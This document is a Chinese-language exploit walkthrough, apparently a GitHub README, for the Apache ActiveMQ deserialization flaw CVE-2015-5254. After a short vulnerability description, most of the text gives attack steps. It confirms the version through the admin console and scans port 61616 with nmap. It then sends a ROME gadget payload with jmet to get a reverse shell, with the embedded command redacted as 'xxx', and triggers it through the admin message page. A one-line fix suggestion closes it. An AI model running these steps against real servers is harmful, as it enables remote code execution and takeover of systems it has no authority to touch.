ActiveMQ反序列化（CVE-2015-5254）

漏洞描述：Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

影响版本：Apache ActiveMQ 5.13.0之前的5.x版本

0x01	登陆后台确定版本：
http://IP:8161

![Image text](https://github.com/gsheller/ActiveMQ_CVE-2015-5254/blob/master/images/version.jpg)

0x02	确定61616端口开放：
nmap -sV -Pn -T4 -sC -p 61616 IP
![Image text](https://github.com/gsheller/ActiveMQ_CVE-2015-5254/blob/master/images/61616.jpg)

0x03	发送反弹payload：
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "xxx" -Yp ROME IP 61616
![Image text](https://github.com/gsheller/ActiveMQ_CVE-2015-5254/blob/master/images/反弹shell.jpg)

0x04	点击触发Browse event-Message ID  ，成功反弹：
http://IP:8161/admin/message.jsp?id=ID&JMSDestination=event
![Image text](https://github.com/gsheller/ActiveMQ_CVE-2015-5254/blob/master/images/成功反弹.jpg)

修复建议：升级到最新版本，配置waf相关规则进行拦截
